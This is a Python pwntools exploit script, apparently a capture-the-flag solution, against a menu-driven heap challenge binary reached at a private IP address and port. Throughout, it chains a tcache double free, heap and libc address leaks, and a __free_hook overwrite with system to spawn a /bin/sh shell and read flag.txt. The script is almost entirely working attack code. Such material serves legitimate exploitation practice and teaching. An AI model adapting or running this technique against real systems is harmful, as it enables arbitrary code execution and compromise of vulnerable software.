#!/usr/bin/python3
from pwn import *
import time
import os

os.chdir('../public/')

elf = context.binary = ELF("./pwn")
libc = ELF("./libc.so.6")
context.terminal = ['tilix', '-a', 'app-new-session', '-e']


def log_addr(name, address):
    s = '{}'.format(name).ljust(16, ' ')
    s += ': {:#x}'.format(address)
    log.info(s)


gs = '''
init-pwndbg
set breakpoint pending on
break execve
continue
'''

HOST = '192.168.125.11'
LHOST = 'localhost'
PORT = 2337

DELAY = 0.5  # needed for remote

def start():
    if args.GDB:
        return gdb.debug(elf.path, gdbscript=gs)
    elif args.R:
        if args.LHOST:
            return remote(LHOST, PORT)
        return remote(HOST, PORT)
    else:
        return process(elf.path)


# Index of allocated chunks.
index = 0


# Select the "malloc" option; send size & data.
# Returns chunk index.
def create(name):
    global index
    io.recvuntil('Please enter an option from the main menu: ')
    io.sendline("1")
    io.sendafter("chars): ", name)
    index += 1
    return index - 1


# Select the "free" option; send index.
def free(index):
    io.recvuntil('Please enter an option from the main menu: ')
    io.sendline("2")
    io.sendlineafter("Index: ", str(index))


def view(index):
    io.recvuntil('Please enter an option from the main menu: ')
    io.sendline("3")
    io.sendlineafter("Index: ", str(index))
    io.recvuntil('Grand Master: ')
    return io.recvline().strip()


# edit
def edit(index, name):
    io.recvuntil('Please enter an option from the main menu: ')
    io.sendline("4")
    io.sendlineafter("Index: ", f'{index}')
    io.sendlineafter("New name: ", name)


io = start()
io.timeout = 0.5

# =-=-=- double free -=-=-=

# Request two fast chunks
a = create(b"magnus")
b = create(b"fischer")
# create one more to overlap fake smallbin
create(b"dubov")
# create one more to guard against wilderness (needed !)
create(b"firouzja")

# Trigger double free
free(a)
free(a)

# =-=-=- leak libc -=-=-=\

# leak heap to know where to overwrite
heap_leak = int.from_bytes(view(a), 'little')
heap_base = heap_leak - 0x260
log_addr('heap leak', heap_leak)
log_addr('heap base', heap_base)

# overwrite A fd to point to size field of chunk
edit(a, p64(heap_leak + 0x60))
# get rid of head of tcachebin
create(b'dubov')
# create fake smallbin to free into unsortedbin
create(p64(0x70) + p64(0xe1))

# fill up 0xe0 tcachebin
for i in range(8):
    free(b)

# leak libc
MAIN_ARENA = 0x3ebc40
libc_leak = int.from_bytes(view(b), 'little')
log_addr('libc leak', libc_leak)
libc.address = libc_leak - (MAIN_ARENA + 96)
log_addr('libc base', libc.address)


# =-=-=-=-=-=-=-=-=  tcache dup =-=-=-=-=-=-=-=-= 
# Request two more chunks
c = create(b"Kasparov")
binsh = create(b'/bin/sh\x00')

# Trigger double free.
# Tcache before glibc 2.29 doesn't have check
free(c)
free(c)

# overwrite a fd with __free_hook
# tcache does not check size of chunk being linked into bins
# tcache uses pointers to user data
create(p64(libc.sym.__free_hook))
# allocate dummy chunk
create(b'Anand')
# get arbitrary write pointer and overwrite __free_hook
create(p64(libc.sym.system))

# Trigger system('/bin/sh')
free(binsh)

io.sendline('cat flag.txt')
io.interactive()
